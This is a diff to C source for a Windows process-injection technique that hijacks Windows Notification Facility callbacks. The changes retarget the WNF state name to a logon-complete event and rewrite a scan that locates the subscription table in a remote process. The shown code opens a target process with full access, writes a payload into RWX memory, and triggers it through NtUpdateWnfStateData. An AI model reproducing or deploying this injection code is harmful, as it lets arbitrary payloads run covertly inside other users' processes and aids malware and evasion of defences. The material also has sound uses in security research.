@@ -33,7 +33,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
 
-#define WNF_SHEL_APPLICATION_STARTED            0x0d83063ea3be0075
+#define WNF_SHEL_LOGON_COMPLETE            0xd83063ea3bc1875
 
 typedef NTSTATUS
 (NTAPI *NtUpdateWnfStateData_t)(
@@ -203,10 +203,10 @@ LPVOID GetUserSubFromProcess(
     PIMAGE_NT_HEADERS        nt;
     PIMAGE_SECTION_HEADER    sh;
     DWORD                    i, j, res, rva = 0;
-    LPBYTE                   ds;
+    PULONG_PTR               ds;
+    ULONG_PTR                ptr;
     MEMORY_BASIC_INFORMATION mbi;
     PWNF_SUBSCRIPTION_TABLE  tbl;
-    ULONG_PTR                ptr;
     SIZE_T                   rd;
     WNF_SUBSCRIPTION_TABLE   st;
     
@@ -230,16 +230,11 @@ LPVOID GetUserSubFromProcess(
       // if this section is writeable, assume it's data
       if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
         // scan section for pointers to the heap
-        ds = RVA2VA(PBYTE, ntdll, sh[i].VirtualAddress);
+        ds = RVA2VA(PULONG_PTR, ntdll, sh[i].VirtualAddress);
          
-        for(j = 0; 
-            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
-            j += sizeof(ULONG_PTR)) 
-        {
-          // get pointer
-          ptr = *(ULONG_PTR*)&ds[j];
-          // query the memory
-          res = VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+        for(j=0; j<(sh[i].Misc.VirtualSize/sizeof(ULONG_PTR)); j++) {
+          // query the pointer value
+          res = VirtualQuery((LPVOID)ds[j], &mbi, sizeof(mbi));
           if(res != sizeof(mbi)) continue;
           
           // if it's a pointer to heap or stack..
@@ -247,13 +242,13 @@ LPVOID GetUserSubFromProcess(
               (mbi.Type    == MEM_PRIVATE   ) && 
               (mbi.Protect == PAGE_READWRITE))
           {
-            tbl = (PWNF_SUBSCRIPTION_TABLE)ptr;
+            tbl = (PWNF_SUBSCRIPTION_TABLE)ds[j];
             // if it looks like subscription table resides here
             if(tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
                tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) 
             {
               // save the Relative Virtual Address
-              rva = (DWORD)(sh[i].VirtualAddress + j);
+              rva = (DWORD)(sh[i].VirtualAddress + j * sizeof(ULONG_PTR));
               break;
             }
           }
@@ -284,7 +279,7 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
     HANDLE                 hp;
     DWORD                  pid;
     SIZE_T                 wr;
-    ULONG64                ns = WNF_SHEL_APPLICATION_STARTED;
+    ULONG64                ns = WNF_SHEL_LOGON_COMPLETE;
     NtUpdateWnfStateData_t _NtUpdateWnfStateData;
     HMODULE                m;
       
@@ -294,7 +289,7 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     
     // 2. Locate user subscription
-    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_APPLICATION_STARTED);
+    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_LOGON_COMPLETE);
     
     // 3. Allocate RWX memory and write payload
     cs = VirtualAllocEx(hp, NULL, payloadSize,
@@ -316,7 +311,6 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
     _NtUpdateWnfStateData(
       &ns, NULL, 0, 0, NULL, 0, 0);
     
-    // 
     Sleep(0);
     
     // 5. Restore original callback, free memory and close process
